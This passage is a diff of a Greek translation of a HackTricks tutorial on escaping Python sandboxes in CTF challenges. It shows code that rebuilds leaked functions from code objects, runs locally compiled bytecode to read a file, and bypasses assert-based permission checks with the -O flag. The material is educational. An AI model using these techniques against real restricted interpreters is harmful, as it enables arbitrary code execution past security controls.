-Καταρχήν, πρέπει να ξέρουμε **πώς να δημιουργήσουμε και να εκτελέσουμε ένα αντικείμενο κώδικα** έτσι ώστε να μπορούμε να δημιουργήσουμε ένα για να εκτελέσουμε τη διαρρευσμένη συνάρτησή μας:
+Καταρχάς, πρέπει να ξέρουμε **πώς να δημιουργήσουμε και να εκτελέσουμε ένα αντικείμενο κώδικα** ώστε να μπορέσουμε να δημιουργήσουμε ένα για να εκτελέσουμε τη λειτουργία μας που διέρρευσε:
 ```python
 code_type = type((lambda: None).__code__)
 # Check the following hint if you get an error in calling this
@@ -1152,7 +912,7 @@ mydict['__builtins__'] = __builtins__
 function_type(code_obj, mydict, None, None, None)("secretcode")
 ```
 {% hint style="info" %}
-Ανάλογα με την έκδοση της Python, οι **παράμετροι** του `code_type` μπορεί να έχουν **διαφορετική σειρά**. Ο καλύτερος τρόπος για να γνωρίζετε τη σειρά των παραμέτρων στην έκδοση της Python που εκτελείτε είναι να εκτελέσετε:
+Ανάλογα με την έκδοση της Python, οι **παράμετροι** του `code_type` μπορεί να έχουν **διαφορετική σειρά**. Ο καλύτερος τρόπος για να μάθετε τη σειρά των παραμέτρων στην έκδοση της Python που χρησιμοποιείτε είναι να εκτελέσετε:
 ```
 import types
 types.CodeType.__doc__
@@ -1160,10 +920,10 @@ types.CodeType.__doc__
 ```
 {% endhint %}
 
-### Αναπαραγωγή μιας διαρρευμένης συνάρτησης
+### Αναπαραγωγή μιας διαρρευσμένης συνάρτησης
 
 {% hint style="warning" %}
-Στο παρακάτω παράδειγμα, θα πάρουμε όλα τα δεδομένα που χρειάζονται για να αναπαράγουμε τη συνάρτηση απευθείας από το αντικείμενο κώδικα της συνάρτησης. Σε ένα **πραγματικό παράδειγμα**, όλες οι **τιμές** για να εκτελέσετε τη συνάρτηση **`code_type`** είναι αυτές που **θα χρειαστείτε να διαρρεύσετε**.
+Στο παρακάτω παράδειγμα, θα πάρουμε όλα τα δεδομένα που χρειάζονται για την αναπαραγωγή της συνάρτησης απευθείας από το αντικείμενο κώδικα της συνάρτησης. Σε ένα **πραγματικό παράδειγμα**, όλες οι **τιμές** που απαιτούνται για την εκτέλεση της συνάρτησης **`code_type`** είναι αυτό που **θα χρειαστείτε να διαρρεύσετε**.
 {% endhint %}
 ```python
 fc = get_flag.__code__
@@ -1175,13 +935,12 @@ mydict['__builtins__'] = __builtins__
 function_type(code_obj, mydict, None, None, None)("secretcode")
 #ThisIsTheFlag
 ```
-### Παράκαμψη Αμυνών
+### Αντιστροφή Αμυντικών Μέτρων
 
-Στα προηγούμενα παραδείγματα στην αρχή αυτής της ανάρτησης, μπορείτε να δείτε **πώς να εκτελέσετε οποιοδήποτε κώδικα Python χρησιμοποιώντας τη συνάρτηση `compile`**. Αυτό είναι ενδιαφέρον επειδή μπορείτε να **εκτελέσετε ολόκληρα σενάρια** με βρόχους και τα πάντα σε μία **μία γραμμή κώδικα** (και μπορούμε να κάνουμε το ίδιο χρησιμοποιώντας το **`exec`**).
+Στα προηγούμενα παραδείγματα στην αρχή αυτής της ανάρτησης, μπορείτε να δείτε **πώς να εκτελέσετε οποιοδήποτε κώδικα Python χρησιμοποιώντας τη λειτουργία `compile`**. Αυτό είναι ενδιαφέρον επειδή μπορείτε **να εκτελέσετε ολόκληρα σενάρια** με βρόχους και τα πάντα σε μια **γραμμή κώδικα** (και θα μπορούσαμε να κάνουμε το ίδιο χρησιμοποιώντας το **`exec`**).\
+Πάντως, μερικές φορές θα μπορούσε να είναι χρήσιμο να **δημιουργήσετε** ένα **μεταγλωττισμένο αντικείμενο** σε ένα τοπικό μηχάνημα και να το εκτελέσετε στο **μηχάνημα CTF** (για παράδειγμα επειδή δεν έχουμε τη λειτουργία `compile` στο CTF).
 
-Παρόλα αυτά, μερικές φορές μπορεί να είναι χρήσιμο να **δημιουργήσουμε** ένα **αντικείμενο που έχει μεταγλωττιστεί** σε μία τοπική μηχανή και να το εκτελέσουμε στη **μηχανή CTF** (για παράδειγμα επειδή δεν έχουμε τη συνάρτηση `compile` στη μηχανή CTF).
-
-Για παράδειγμα, ας μεταγλωττίσουμε και να εκτελέσουμε χειροκίνητα μια συνάρτηση που διαβάζει το _./poc.py_:
+Για παράδειγμα, ας μεταγλωττίσουμε και εκτελέσουμε χειροκίνητα μια συνάρτηση που διαβάζει το _./poc.py_:
 ```python
 #Locally
 def read():
@@ -1208,7 +967,7 @@ mydict['__builtins__'] = __builtins__
 codeobj = code_type(0, 0, 3, 64, bytecode, consts, names, (), 'noname', '<module>', 1, '', (), ())
 function_type(codeobj, mydict, None, None, None)()
 ```
-Εάν δεν μπορείτε να έχετε πρόσβαση στις εντολές `eval` ή `exec`, μπορείτε να δημιουργήσετε μια **κανονική συνάρτηση**, αλλά η κλήση της απευθείας συνήθως θα αποτύχει με το μήνυμα: _constructor not accessible in restricted mode_. Επομένως, χρειάζεστε μια **συνάρτηση που δεν βρίσκεται σε περιορισμένο περιβάλλον για να καλέσετε αυτήν τη συνάρτηση**.
+Αν δεν μπορείτε να έχετε πρόσβαση στο `eval` ή `exec`, μπορείτε να δημιουργήσετε μια **κανονική συνάρτηση**, αλλά η κλήση της απευθείας συνήθως θα αποτύχει με: _constructor not accessible in restricted mode_. Έτσι, χρειάζεστε μια **συνάρτηση που δεν βρίσκεται στο περιορισμένο περιβάλλον για να καλέσετε αυτήν τη συνάρτηση.**
 ```python
 #Compile a regular print
 ftype = type(lambda: None)
@@ -1230,7 +989,7 @@ f(42)
 
 ### Assert
 
-Ο Python που εκτελείται με βελτιστοποιήσεις με την παράμετρο `-O` θα αφαιρέσει τις δηλώσεις assert και οποιονδήποτε κώδικα που εξαρτάται από την τιμή της **debug**.\
+Ο Python που εκτελείται με βελτιστοποιήσεις με την παράμετρο `-O` θα αφαιρέσει τις δηλώσεις assert και οποιονδήποτε κώδικα που εξαρτάται από την τιμή του **debug**.\
 Επομένως, ελέγχοι όπως
 ```python
 def check_permission(super_user):
@@ -1249,25 +1008,18 @@ print(f"\nNot a Super User!!!\n")
 * [https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html](https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html)
 * [https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6](https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6)
 
-
-<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
-
-Βρείτε ευπάθειες που είναι πιο σημαντικές, ώστε να μπορείτε να τις διορθώσετε πιο γρήγορα. Ο Intruder παρακολουθεί την επιθετική επιφάνεια σας, εκτελεί προληπτικές απειλητικές αναζητήσεις, εντοπίζει προβλήματα σε ολόκληρο το τεχνολογικό σας στοίχημα, από APIs έως ιστοσελίδες και συστήματα cloud. [**Δοκιμάστε το δωρεάν**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) σήμερα.
-
-{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
-
 ***
 
 <details>
 
-<summary><strong>Μάθετε το hacking του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Άλλοι τρόποι για να υποστηρίξετε το HackTricks:
+Άλλοι τρόποι υποστήριξης του HackTricks:
 
-* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** Ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
+* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
 * Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Μοιραστείτε τα κόλπα σας για το hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.
+* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
+* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο GitHub.
 
 </details>
